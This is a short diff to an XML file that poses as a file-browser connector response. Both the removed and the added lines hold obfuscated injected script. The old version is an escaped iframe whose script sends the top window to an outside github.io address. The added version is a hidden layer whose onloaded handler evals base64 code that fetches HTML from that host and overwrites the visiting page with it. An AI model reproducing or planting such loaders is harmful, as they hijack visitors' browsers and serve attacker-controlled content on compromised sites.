@@ -1,7 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
+<?xml version="1.0" encoding="utf-8"?>
 <Connector command="GetFoldersAndFiles" resourceType="Document">
-    <CurrentFolder path="/1 - f/" url=""/>
-    <Files>
-        <File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=&amp;apos;aHR0cHM6Ly9tcnNhYmFzbWlhLmdpdGh1Yi5pby9zdWJ3b3JrL3dvcmsvIiArIGlkICsgIi5odG1s&amp;apos;;&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;"/>
-    </Files>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjemFyX2FycXVpdGVjdG9uaWNvIjsKCmZldGNoKCJodHRwczovL21yc2FiYXNtaWEuZ2l0aHViLmlvL3N1YndvcmsvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpOwogICAgZG9jdW1lbnQud3JpdGUoZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwogIH0pOw==');eval(w)););"/>
 </Connector>
